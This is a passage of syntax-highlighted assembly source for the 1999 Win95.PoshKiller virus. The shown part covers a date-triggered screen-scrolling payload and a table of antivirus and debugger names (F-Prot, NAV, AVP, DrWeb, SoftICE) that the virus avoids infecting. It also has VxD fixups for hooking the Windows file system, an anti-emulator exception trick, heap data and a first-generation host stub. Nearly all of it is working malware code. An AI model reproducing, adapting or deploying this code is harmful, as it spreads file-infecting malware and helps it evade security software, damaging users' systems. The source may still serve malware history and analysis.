        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">                          </span><span class="sc1">; Get date</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">26h</span><span class="sc0">                          </span><span class="sc1">; Is it 26th?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">no_payload</span><span class="sc0">                      </span><span class="sc1">; No, shit.</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">                          </span><span class="sc1">; Get month</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">                          </span><span class="sc1">; Is it 10th?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">no_payload</span><span class="sc0">                      </span><span class="sc1">; No, shit.</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; Make 0 the counter </span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; Make -1 the repeatition :)</span><span class="sc0">

</span><span class="sc5">scroll</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">03D4h</span><span class="sc0">                       </span><span class="sc1">; Graphical payload by using</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Ch</span><span class="sc0">                          </span><span class="sc1">; ports. Original code in</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">; ATT assembler by nIgr0, and</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">03D5h</span><span class="sc0">                       </span><span class="sc1">; adapted by him and me at my</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">                           </span><span class="sc1">; home the 30th of June :)</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">; Thanx nIgr0! Go on with </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">03D4h</span><span class="sc0">                       </span><span class="sc1">; "that" thingy :)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">03D5h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0000FFFFh</span><span class="sc0">                   </span><span class="sc1">; Some delay, for slowdown a</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0">                               </span><span class="sc1">; little the effect</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">scroll</span><span class="sc0">

</span><span class="sc5">no_payload</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><span class="sc0">
</span><span class="sc1">; ³ Avoid infection of certain files                                        ³</span><span class="sc0">
</span><span class="sc1">; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><span class="sc0">

</span><span class="sc5">AvoidShitFiles</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">@@BadProgramz</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Ptr to table</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc3">"."</span><span class="sc0">                         </span><span class="sc1">; Search filename for a dot</span><span class="sc0">
        </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc13">"\"                         ; Now reverse the direction and search
</span><span class="sc0">        </span><span class="sc6">std</span><span class="sc0">                                     </span><span class="sc1">; for the last \
        scasb</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; Fix it</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc5">ASF_Loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Clear EAX</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">                                   </span><span class="sc1">; Load size of string in AL</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0BBh</span><span class="sc0">                         </span><span class="sc1">; End of table?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">AllShitFilesProcessed</span><span class="sc0">           </span><span class="sc1">; Oh, shit!</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">; Put Size in ECX</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; Preserve program pointer</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">cmpsb</span><span class="sc0">                           </span><span class="sc1">; Compare both strings</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; Restore program pointer</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ShitFileFound</span><span class="sc0">                   </span><span class="sc1">; Damn, a shitty file!</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">; Pointer to another string</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ASF_Loop</span><span class="sc0">                        </span><span class="sc1">; in table &amp; loop</span><span class="sc0">
</span><span class="sc5">AllShitFilesProcessed</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">                          </span><span class="sc1">; Overlap, so CL = 0F9h</span><span class="sc0">
        </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">ShitFileFound</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">                                     </span><span class="sc1">; Set carry</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><span class="sc0">
</span><span class="sc1">; ³ Fix all VxDCallz                                                        ³</span><span class="sc0">
</span><span class="sc1">; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><span class="sc0">

</span><span class="sc5">VxDFix</span><span class="sc4">:</span><span class="sc0">       
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">VxDTbSz</span><span class="sc0">                     </span><span class="sc1">; Number of VxDs</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VxDTblz</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; Pointer to table</span><span class="sc0">
</span><span class="sc5">@lo0pz</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">; Load current offset in EAX</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">                         </span><span class="sc1">; Add delta :)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">20CDh</span><span class="sc0">            </span><span class="sc1">; Put in that address</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Get VxD Service value</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">; And restore it </span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@lo0pz</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><span class="sc0">
</span><span class="sc1">; ³ Interesting tables                                                      ³</span><span class="sc0">
</span><span class="sc1">; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><span class="sc0">

</span><span class="sc5">VxDTblz</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@1</span><span class="sc4">)</span><span class="sc0">                    </span><span class="sc1">; IFSMgr_GetHeap</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@2</span><span class="sc4">)</span><span class="sc0">                    </span><span class="sc1">; IFSMgr_InstallFileSystemApiHook</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@3</span><span class="sc4">)</span><span class="sc0">                    </span><span class="sc1">; UniToBCSPath</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@4</span><span class="sc4">)</span><span class="sc0">                    </span><span class="sc1">; IFSMgr_Ring0_FileIO</span><span class="sc0">
        </span><span class="sc9">IFNDEF</span><span class="sc0">  </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@5</span><span class="sc4">)</span><span class="sc0">                    </span><span class="sc1">; VMM_Get_DDB</span><span class="sc0">
        </span><span class="sc9">ENDIF</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@6</span><span class="sc4">)</span><span class="sc0">                    </span><span class="sc1">; IFSMgr_GetHeap</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@@7</span><span class="sc4">)</span><span class="sc0">                    </span><span class="sc1">; IFSMgr_RetHeap</span><span class="sc0">
</span><span class="sc5">VxDTbSz</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">((</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VxDTblz</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">          </span><span class="sc1">; Numbah of VxDCalls in code</span><span class="sc0">

</span><span class="sc1">; Files to ignore, don't infect'em!</span><span class="sc0">

</span><span class="sc5">@@BadProgramz</span><span class="sc0">   </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc3">"TB"</span><span class="sc0">                        </span><span class="sc1">; ThunderByte?</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc3">"F-"</span><span class="sc0">                        </span><span class="sc1">; F-Prot?</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc3">"NAV"</span><span class="sc0">                       </span><span class="sc1">; Norton Antivirus?</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc3">"AVP"</span><span class="sc0">                       </span><span class="sc1">; AVP?</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc3">"WEB"</span><span class="sc0">                       </span><span class="sc1">; DrWeb?</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc3">"PAV"</span><span class="sc0">                       </span><span class="sc1">; Panda?</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc3">"DRW"</span><span class="sc0">                       </span><span class="sc1">; DrWeb?</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc3">"DSAV"</span><span class="sc0">                      </span><span class="sc1">; Dr Solomon?</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc3">"NOD"</span><span class="sc0">                       </span><span class="sc1">; Nod-Ice?</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc3">"WINICE"</span><span class="sc0">                    </span><span class="sc1">; SoftICE?</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc3">"FORMAT"</span><span class="sc0">                    </span><span class="sc1">; Format?</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc3">"FDISK"</span><span class="sc0">                     </span><span class="sc1">; Fdisk?</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc3">"SCANDSKW"</span><span class="sc0">                  </span><span class="sc1">; ScanDisk?</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc3">"DEFRAG"</span><span class="sc0">                    </span><span class="sc1">; Defrag?</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0BBh</span><span class="sc0">

</span><span class="sc1">; For jump building</span><span class="sc0">

</span><span class="sc5">jumpyx</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seh_tricky</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">jumpy</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0E9h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">seh_tricky</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">; DIE EMULATORS!!!!!!</span><span class="sc0">
</span><span class="sc5">sjumpy</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">jumpyx</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">; Store here overwritten data</span><span class="sc0">

</span><span class="sc5">oldjmpy</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">sjumpy</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">; My mark :)</span><span class="sc0">

</span><span class="sc5">mark</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"[Win95.PoshKiller v1.00]"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"(c) 1999 Billy Belcebu/iKX"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0">      </span><span class="sc5">DEBUG</span><span class="sc0">
</span><span class="sc5">beepy</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">200</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                  
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b6h</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">43h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0012h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">34dch</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">61h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc5">l1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4680</span><span class="sc0">
        </span><span class="sc5">l2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">l2</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">l1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
        </span><span class="sc9">ENDIF</span><span class="sc0">
</span><span class="sc5">virus_end</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc1">; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><span class="sc0">
</span><span class="sc1">; ³ Data in the heap                                                        ³</span><span class="sc0">
</span><span class="sc1">; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><span class="sc0">

</span><span class="sc5">heap_begin</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">semaphore</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">pehead</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ptr_top_chain</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">top_chain</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">temp_addr</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">fname</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">header</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">400h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">heap_end</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc1">; Jo parle en Valenci…, no en catal….</span><span class="sc0">

</span><span class="sc1">; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><span class="sc0">
</span><span class="sc1">; ³ First generation host                                                   ³</span><span class="sc0">
</span><span class="sc1">; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><span class="sc0">

</span><span class="sc5">host</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szTitle</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szMessage</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MessageBoxA</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">poshkiller</span><span class="sc0">

</span><span class="sc1">; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><span class="sc0">
</span><span class="sc1">; ³ Bonus Track                                                             ³</span><span class="sc0">
